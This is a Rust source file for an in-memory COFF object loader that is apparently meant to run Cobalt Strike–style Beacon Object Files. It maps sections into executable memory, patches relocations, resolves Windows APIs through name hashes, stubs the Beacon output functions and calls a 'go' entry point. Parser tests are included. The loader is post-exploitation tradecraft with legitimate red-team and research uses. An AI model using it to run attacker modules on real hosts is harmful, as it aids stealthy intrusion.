use std::collections::HashMap;
use std::fmt;

const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
const IMAGE_REL_AMD64_ADDR64: u16 = 0x0001;
const IMAGE_REL_AMD64_ADDR32: u16 = 0x0002;
const IMAGE_REL_AMD64_ADDR32NB: u16 = 0x0003;
const IMAGE_REL_AMD64_REL32: u16 = 0x0004;
const IMAGE_REL_AMD64_REL32_1: u16 = 0x0005;
const IMAGE_REL_AMD64_REL32_2: u16 = 0x0006;
const IMAGE_REL_AMD64_REL32_3: u16 = 0x0007;
const IMAGE_REL_AMD64_REL32_4: u16 = 0x0008;
const IMAGE_REL_AMD64_REL32_5: u16 = 0x0009;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CoffError {
    InvalidObject,
    UnsupportedMachine(u16),
    UnsupportedRelocation(u16),
    MissingSymbol(String),
    MissingEntrypoint(String),
    AddressOutOfRange,
    AllocationFailed,
    UnsupportedPlatform,
}

impl fmt::Display for CoffError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{self:?}")
    }
}

pub type ApiResolver = fn(module_hash: u32, symbol_hash: u32) -> Option<usize>;

pub struct CoffLoader {
    resolver: ApiResolver,
    internal: HashMap<String, usize>,
}

impl CoffLoader {
    pub fn new(resolver: ApiResolver) -> Self {
        Self {
            resolver,
            internal: HashMap::new(),
        }
    }

    pub fn register_internal(&mut self, name: impl Into<String>, address: usize) {
        self.internal.insert(name.into(), address);
    }

    pub fn execute(
        &self,
        object: &[u8],
        entry: &str,
        arguments: &[u8],
    ) -> Result<Vec<u8>, CoffError> {
        let parsed = CoffObject::parse(object)?;
        #[cfg(windows)]
        {
            return windows::execute(self, &parsed, entry, arguments);
        }
        #[cfg(not(windows))]
        {
            let _ = parsed;
            let _ = (entry, arguments);
            Err(CoffError::UnsupportedPlatform)
        }
    }
}

fn hash_name(value: &str) -> u32 {
    value.bytes().fold(0x811c_9dc5, |hash, byte| {
        (hash ^ byte.to_ascii_lowercase() as u32).wrapping_mul(0x0100_0193)
    })
}

#[derive(Debug)]
struct CoffObject<'a> {
    sections: Vec<Section<'a>>,
    symbols: Vec<Option<Symbol>>,
}

#[derive(Debug)]
struct Section<'a> {
    data: &'a [u8],
    virtual_size: usize,
    relocations: Vec<Relocation>,
}

#[derive(Debug, Clone)]
struct Symbol {
    name: String,
    value: u32,
    section: i16,
}

#[derive(Debug)]
struct Relocation {
    offset: u32,
    symbol: usize,
    kind: u16,
}

impl<'a> CoffObject<'a> {
    fn parse(data: &'a [u8]) -> Result<Self, CoffError> {
        if data.len() < 20 {
            return Err(CoffError::InvalidObject);
        }
        let machine = u16_at(data, 0)?;
        if machine != IMAGE_FILE_MACHINE_AMD64 {
            return Err(CoffError::UnsupportedMachine(machine));
        }
        let section_count = u16_at(data, 2)? as usize;
        let symbol_offset = u32_at(data, 8)? as usize;
        let symbol_count = u32_at(data, 12)? as usize;
        let optional_size = u16_at(data, 16)? as usize;
        let section_table = 20usize
            .checked_add(optional_size)
            .ok_or(CoffError::InvalidObject)?;
        checked_range(
            data,
            section_table,
            section_count
                .checked_mul(40)
                .ok_or(CoffError::InvalidObject)?,
        )?;
        checked_range(
            data,
            symbol_offset,
            symbol_count
                .checked_mul(18)
                .ok_or(CoffError::InvalidObject)?,
        )?;

        let string_offset = symbol_offset
            .checked_add(
                symbol_count
                    .checked_mul(18)
                    .ok_or(CoffError::InvalidObject)?,
            )
            .ok_or(CoffError::InvalidObject)?;
        let string_size = u32_at(data, string_offset)? as usize;
        if string_size < 4 {
            return Err(CoffError::InvalidObject);
        }
        let strings = checked_range(data, string_offset, string_size)?;

        let mut symbols = vec![None; symbol_count];
        let mut index = 0;
        while index < symbol_count {
            let offset = symbol_offset + index * 18;
            let name = symbol_name(data, offset, strings)?;
            let value = u32_at(data, offset + 8)?;
            let section = i16_at(data, offset + 12)?;
            let aux = *data.get(offset + 17).ok_or(CoffError::InvalidObject)? as usize;
            symbols[index] = Some(Symbol {
                name,
                value,
                section,
            });
            index = index.checked_add(1 + aux).ok_or(CoffError::InvalidObject)?;
            if index > symbol_count {
                return Err(CoffError::InvalidObject);
            }
        }

        let mut sections = Vec::with_capacity(section_count);
        for index in 0..section_count {
            let offset = section_table + index * 40;
            let raw_size = u32_at(data, offset + 16)? as usize;
            let declared_size = u32_at(data, offset + 8)? as usize;
            let raw_offset = u32_at(data, offset + 20)? as usize;
            let reloc_offset = u32_at(data, offset + 24)? as usize;
            let reloc_count = u16_at(data, offset + 32)? as usize;
            let data_slice = if raw_size == 0 {
                &data[0..0]
            } else {
                checked_range(data, raw_offset, raw_size)?
            };
            let mut relocations = Vec::with_capacity(reloc_count);
            checked_range(
                data,
                reloc_offset,
                reloc_count
                    .checked_mul(10)
                    .ok_or(CoffError::InvalidObject)?,
            )?;
            for reloc_index in 0..reloc_count {
                let reloc = reloc_offset + reloc_index * 10;
                relocations.push(Relocation {
                    offset: u32_at(data, reloc)?,
                    symbol: u32_at(data, reloc + 4)? as usize,
                    kind: u16_at(data, reloc + 8)?,
                });
            }
            sections.push(Section {
                data: data_slice,
                virtual_size: raw_size.max(declared_size).max(1),
                relocations,
            });
        }
        Ok(Self { sections, symbols })
    }
}

fn symbol_name(data: &[u8], offset: usize, strings: &[u8]) -> Result<String, CoffError> {
    let name = checked_range(data, offset, 8)?;
    let bytes = if name[..4] == [0; 4] {
        let string_index = u32::from_le_bytes(name[4..8].try_into().unwrap()) as usize;
        if string_index < 4 || string_index >= strings.len() {
            return Err(CoffError::InvalidObject);
        }
        let tail = &strings[string_index..];
        let end = tail
            .iter()
            .position(|byte| *byte == 0)
            .ok_or(CoffError::InvalidObject)?;
        &tail[..end]
    } else {
        &name[..name.iter().position(|byte| *byte == 0).unwrap_or(8)]
    };
    String::from_utf8(bytes.to_vec()).map_err(|_| CoffError::InvalidObject)
}

fn checked_range(data: &[u8], offset: usize, size: usize) -> Result<&[u8], CoffError> {
    data.get(offset..offset.checked_add(size).ok_or(CoffError::InvalidObject)?)
        .ok_or(CoffError::InvalidObject)
}

fn u16_at(data: &[u8], offset: usize) -> Result<u16, CoffError> {
    Ok(u16::from_le_bytes(
        checked_range(data, offset, 2)?.try_into().unwrap(),
    ))
}

fn i16_at(data: &[u8], offset: usize) -> Result<i16, CoffError> {
    Ok(i16::from_le_bytes(
        checked_range(data, offset, 2)?.try_into().unwrap(),
    ))
}

fn u32_at(data: &[u8], offset: usize) -> Result<u32, CoffError> {
    Ok(u32::from_le_bytes(
        checked_range(data, offset, 4)?.try_into().unwrap(),
    ))
}

#[cfg(windows)]
mod windows {
    use super::*;
    use std::ffi::{c_char, CStr, CString};
    use std::ptr::{copy_nonoverlapping, null_mut};
    use std::sync::Mutex;
    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    };

    static OUTPUT: Mutex<Vec<u8>> = Mutex::new(Vec::new());

    struct Allocation(*mut u8);
    impl Drop for Allocation {
        fn drop(&mut self) {
            unsafe {
                VirtualFree(self.0.cast(), 0, MEM_RELEASE);
            }
        }
    }

    pub(super) fn execute(
        loader: &CoffLoader,
        object: &CoffObject<'_>,
        entry: &str,
        arguments: &[u8],
    ) -> Result<Vec<u8>, CoffError> {
        let section_bytes: usize = object
            .sections
            .iter()
            .map(|section| align(section.virtual_size, 16))
            .sum();
        let external_count = object
            .symbols
            .iter()
            .flatten()
            .filter(|symbol| symbol.section == 0 && symbol.value == 0)
            .count();
        let total = section_bytes
            .checked_add(
                external_count
                    .checked_mul(16)
                    .ok_or(CoffError::InvalidObject)?,
            )
            .ok_or(CoffError::InvalidObject)?;
        let base = unsafe {
            VirtualAlloc(
                null_mut(),
                total.max(1),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        } as *mut u8;
        if base.is_null() {
            return Err(CoffError::AllocationFailed);
        }
        let _allocation = Allocation(base);

        let mut section_addresses = Vec::with_capacity(object.sections.len());
        let mut cursor = 0usize;
        for section in &object.sections {
            let address = unsafe { base.add(cursor) };
            if !section.data.is_empty() {
                unsafe { copy_nonoverlapping(section.data.as_ptr(), address, section.data.len()) };
            }
            section_addresses.push(address as usize);
            cursor += align(section.virtual_size, 16);
        }

        let mut externals = HashMap::new();
        for (index, symbol) in object.symbols.iter().enumerate() {
            let Some(symbol) = symbol else { continue };
            if symbol.section == 0 && symbol.value == 0 {
                let target = resolve_external(loader, &symbol.name)?;
                let local = unsafe { base.add(cursor) };
                if symbol.name.starts_with("__imp_") {
                    // An indirect import relocation addresses an in-image pointer slot.
                    unsafe { std::ptr::write_unaligned(local as *mut usize, target) };
                } else {
                    // Direct REL32 calls need a nearby thunk because the Rust/Win32 target
                    // may be outside the signed 32-bit displacement range.
                    unsafe {
                        *local = 0x48;
                        *local.add(1) = 0xb8;
                        copy_nonoverlapping(
                            (target as u64).to_le_bytes().as_ptr(),
                            local.add(2),
                            8,
                        );
                        *local.add(10) = 0xff;
                        *local.add(11) = 0xe0;
                    }
                }
                externals.insert(index, (target, local as usize));
                cursor += 16;
            }
        }

        for (section_index, section) in object.sections.iter().enumerate() {
            for relocation in &section.relocations {
                apply_relocation(
                    base as usize,
                    section_addresses[section_index],
                    relocation,
                    object,
                    &section_addresses,
                    &externals,
                )?;
            }
        }

        let entry_address = object
            .symbols
            .iter()
            .flatten()
            .find(|symbol| symbol.name == entry && symbol.section > 0)
            .and_then(|symbol| {
                section_addresses
                    .get(symbol.section as usize - 1)
                    .map(|base| base + symbol.value as usize)
            })
            .ok_or_else(|| CoffError::MissingEntrypoint(entry.to_owned()))?;

        OUTPUT.lock().unwrap().clear();
        let mut args = arguments.to_vec();
        let go: unsafe extern "C" fn(*mut c_char, i32) =
            unsafe { std::mem::transmute(entry_address) };
        unsafe { go(args.as_mut_ptr().cast(), args.len() as i32) };
        Ok(std::mem::take(&mut *OUTPUT.lock().unwrap()))
    }

    fn resolve_external(loader: &CoffLoader, raw_name: &str) -> Result<usize, CoffError> {
        let name = raw_name.strip_prefix("__imp_").unwrap_or(raw_name);
        if let Some(address) = loader.internal.get(name) {
            return Ok(*address);
        }
        match name {
            "BeaconOutput" => return Ok(beacon_output as *const () as usize),
            "BeaconPrintf" => return Ok(beacon_printf as *const () as usize),
            _ => {}
        }
        let (library, function) = name
            .split_once('$')
            .ok_or_else(|| CoffError::MissingSymbol(name.to_owned()))?;
        if let Some(address) = (loader.resolver)(hash_name(library), hash_name(function)) {
            return Ok(address);
        }
        let module_name = if library.to_ascii_lowercase().ends_with(".dll") {
            library.to_owned()
        } else {
            format!("{library}.dll")
        };
        let module = CString::new(module_name).map_err(|_| CoffError::InvalidObject)?;
        let function_name = CString::new(function).map_err(|_| CoffError::InvalidObject)?;
        unsafe {
            let handle = LoadLibraryA(module.as_ptr().cast());
            if handle.is_null() {
                return Err(CoffError::MissingSymbol(name.to_owned()));
            }
            GetProcAddress(handle, function_name.as_ptr().cast())
                .map(|proc| proc as usize)
                .ok_or_else(|| CoffError::MissingSymbol(name.to_owned()))
        }
    }

    fn apply_relocation(
        image_base: usize,
        section_base: usize,
        relocation: &Relocation,
        object: &CoffObject<'_>,
        sections: &[usize],
        externals: &HashMap<usize, (usize, usize)>,
    ) -> Result<(), CoffError> {
        let symbol = object
            .symbols
            .get(relocation.symbol)
            .and_then(Option::as_ref)
            .ok_or(CoffError::InvalidObject)?;
        let (absolute, branch) = if symbol.section > 0 {
            let target = sections
                .get(symbol.section as usize - 1)
                .ok_or(CoffError::InvalidObject)?
                .checked_add(symbol.value as usize)
                .ok_or(CoffError::AddressOutOfRange)?;
            (target, target)
        } else {
            *externals
                .get(&relocation.symbol)
                .ok_or_else(|| CoffError::MissingSymbol(symbol.name.clone()))?
        };
        let patch = section_base
            .checked_add(relocation.offset as usize)
            .ok_or(CoffError::AddressOutOfRange)?;
        unsafe {
            match relocation.kind {
                IMAGE_REL_AMD64_ADDR64 => {
                    let addend = std::ptr::read_unaligned(patch as *const u64);
                    std::ptr::write_unaligned(
                        patch as *mut u64,
                        (absolute as u64).wrapping_add(addend),
                    );
                }
                IMAGE_REL_AMD64_ADDR32 => {
                    let addend = std::ptr::read_unaligned(patch as *const u32) as usize;
                    let value = absolute
                        .checked_add(addend)
                        .ok_or(CoffError::AddressOutOfRange)?;
                    std::ptr::write_unaligned(
                        patch as *mut u32,
                        u32::try_from(value).map_err(|_| CoffError::AddressOutOfRange)?,
                    );
                }
                IMAGE_REL_AMD64_ADDR32NB => {
                    let addend = std::ptr::read_unaligned(patch as *const u32) as usize;
                    let value = absolute
                        .checked_sub(image_base)
                        .and_then(|value| value.checked_add(addend))
                        .ok_or(CoffError::AddressOutOfRange)?;
                    std::ptr::write_unaligned(
                        patch as *mut u32,
                        u32::try_from(value).map_err(|_| CoffError::AddressOutOfRange)?,
                    );
                }
                IMAGE_REL_AMD64_REL32
                | IMAGE_REL_AMD64_REL32_1
                | IMAGE_REL_AMD64_REL32_2
                | IMAGE_REL_AMD64_REL32_3
                | IMAGE_REL_AMD64_REL32_4
                | IMAGE_REL_AMD64_REL32_5 => {
                    let bias = (relocation.kind - IMAGE_REL_AMD64_REL32) as isize;
                    let addend = std::ptr::read_unaligned(patch as *const i32) as isize;
                    let next = patch as isize + 4 + bias;
                    let displacement = branch as isize - next + addend;
                    std::ptr::write_unaligned(
                        patch as *mut i32,
                        i32::try_from(displacement).map_err(|_| CoffError::AddressOutOfRange)?,
                    );
                }
                kind => return Err(CoffError::UnsupportedRelocation(kind)),
            }
        }
        Ok(())
    }

    unsafe extern "C" fn beacon_output(kind: i32, data: *const u8, length: i32) {
        if data.is_null() || length <= 0 {
            return;
        }
        let bytes = unsafe { std::slice::from_raw_parts(data, length as usize) };
        let mut output = OUTPUT.lock().unwrap();
        if kind == 0x0d {
            output.extend_from_slice(b"[!] ");
        }
        output.extend_from_slice(bytes);
    }

    // This fixed signature receives the first two x64 varargs in R8/R9. It deliberately
    // implements the common BOF printf subset without relying on unstable Rust C variadics.
    unsafe extern "C" fn beacon_printf(kind: i32, format: *const c_char, arg0: usize, arg1: usize) {
        if format.is_null() {
            return;
        }
        let format = unsafe { CStr::from_ptr(format) }.to_bytes();
        let rendered = render_printf(format, [arg0, arg1]);
        unsafe { beacon_output(kind, rendered.as_ptr(), rendered.len() as i32) };
    }

    fn render_printf(format: &[u8], args: [usize; 2]) -> Vec<u8> {
        let mut output = Vec::new();
        let mut arg = 0usize;
        let mut index = 0usize;
        while index < format.len() {
            if format[index] != b'%' || index + 1 >= format.len() {
                output.push(format[index]);
                index += 1;
                continue;
            }
            index += 1;
            if format[index] == b'%' {
                output.push(b'%');
                index += 1;
                continue;
            }
            while index < format.len() && b"-+ #0*.0123456789hlIz".contains(&format[index]) {
                index += 1;
            }
            if index >= format.len() || arg >= args.len() {
                break;
            }
            let value = args[arg];
            arg += 1;
            match format[index] {
                b's' => {
                    if value != 0 {
                        output.extend_from_slice(
                            unsafe { CStr::from_ptr(value as *const c_char) }.to_bytes(),
                        );
                    }
                }
                b'c' => output.push(value as u8),
                b'd' | b'i' => output.extend_from_slice((value as i64).to_string().as_bytes()),
                b'u' => output.extend_from_slice((value as u64).to_string().as_bytes()),
                b'x' => output.extend_from_slice(format!("{value:x}").as_bytes()),
                b'X' => output.extend_from_slice(format!("{value:X}").as_bytes()),
                b'p' => output.extend_from_slice(format!("0x{value:x}").as_bytes()),
                other => {
                    output.push(b'%');
                    output.push(other);
                }
            }
            index += 1;
        }
        output
    }

    fn align(value: usize, alignment: usize) -> usize {
        (value + alignment - 1) & !(alignment - 1)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fixture() -> Vec<u8> {
        // One .text section containing `ret`, one external symbol, one REL32 relocation,
        // and one `go` symbol. The fixture is parser-focused and is safe on non-Windows.
        let mut data = vec![0u8; 20 + 40];
        data[0..2].copy_from_slice(&IMAGE_FILE_MACHINE_AMD64.to_le_bytes());
        data[2..4].copy_from_slice(&1u16.to_le_bytes());
        let raw = data.len();
        data.extend_from_slice(&[0xe8, 0, 0, 0, 0, 0xc3]);
        let reloc = data.len();
        data.extend_from_slice(&1u32.to_le_bytes());
        data.extend_from_slice(&1u32.to_le_bytes());
        data.extend_from_slice(&IMAGE_REL_AMD64_REL32.to_le_bytes());
        let symbols = data.len();
        let mut go = [0u8; 18];
        go[..2].copy_from_slice(b"go");
        go[12..14].copy_from_slice(&1i16.to_le_bytes());
        go[16] = 2;
        data.extend_from_slice(&go);
        let mut external = [0u8; 18];
        external[..8].copy_from_slice(b"BeaconOu");
        external[16] = 2;
        data.extend_from_slice(&external);
        data.extend_from_slice(&4u32.to_le_bytes());

        data[8..12].copy_from_slice(&(symbols as u32).to_le_bytes());
        data[12..16].copy_from_slice(&2u32.to_le_bytes());
        let section = 20;
        data[section..section + 5].copy_from_slice(b".text");
        data[section + 16..section + 20].copy_from_slice(&6u32.to_le_bytes());
        data[section + 20..section + 24].copy_from_slice(&(raw as u32).to_le_bytes());
        data[section + 24..section + 28].copy_from_slice(&(reloc as u32).to_le_bytes());
        data[section + 32..section + 34].copy_from_slice(&1u16.to_le_bytes());
        data
    }

    #[test]
    fn parses_amd64_coff_and_relocation() {
        let fixture = fixture();
        let object = CoffObject::parse(&fixture).unwrap();
        assert_eq!(object.sections.len(), 1);
        assert_eq!(object.sections[0].data, &[0xe8, 0, 0, 0, 0, 0xc3]);
        assert_eq!(
            object.sections[0].relocations[0].kind,
            IMAGE_REL_AMD64_REL32
        );
        assert_eq!(object.symbols[0].as_ref().unwrap().name, "go");
    }

    #[test]
    fn rejects_non_amd64_objects() {
        let mut object = fixture();
        object[0..2].copy_from_slice(&0x014cu16.to_le_bytes());
        assert_eq!(
            CoffObject::parse(&object).unwrap_err(),
            CoffError::UnsupportedMachine(0x014c)
        );
    }

    #[test]
    fn hashes_names_case_insensitively() {
        assert_eq!(hash_name("KERNEL32"), hash_name("kernel32"));
    }
}
